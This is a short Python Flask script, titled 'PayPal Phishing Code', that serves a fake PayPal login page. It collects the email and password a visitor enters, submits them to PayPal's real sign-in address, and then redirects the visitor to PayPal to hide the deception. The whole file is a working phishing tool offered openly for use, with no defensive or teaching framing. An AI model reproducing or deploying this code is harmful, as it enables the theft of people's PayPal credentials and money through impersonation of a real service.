# PayPal Phishing Code

import requests
from flask import Flask, request, redirect, render_template_string
from bs4 import BeautifulSoup

app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string("""
    <html>
    <head>
        <title>PayPal - Log In</title>
    </head>
    <body>
        <h2>PayPal - Log In</h2>
        <form action="/login" method="post">
            <label for="email">Email:</label><br>
            <input type="text" id="email" name="email"><br>
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password"><br><br>
            <input type="submit" value="Log In">
        </form>
    </body>
    </html>
    """)

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    
    # Send fake login request to the specified URL
    try:
        # URL of the PayPal login page
        paypal_login_url = "https://www.paypal.com/signin"
        
        # Send a GET request to the PayPal login page
        response = requests.get(paypal_login_url)
        
        # Parse the HTML content of the response
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Extract the login form from the HTML
        login_form = soup.find('form', {'id': 'login'})
        
        # Prepare fake login credentials
        fake_credentials = {
            'login_email': email,
            'login_password': password
        }
        
        # Send a POST request with fake credentials to the PayPal login endpoint
        response = requests.post(paypal_login_url, data=fake_credentials)
        
        # Check if the login attempt was successful
        if response.status_code == 200:
            return redirect("https://www.paypal.com/signin", code=302)
        else:
            return "Failed to send fake PayPal login credentials."
    except Exception as e:
        return "Error occurred: {}".format(e)

if __name__ == '__main__':
    app.run(debug=True)
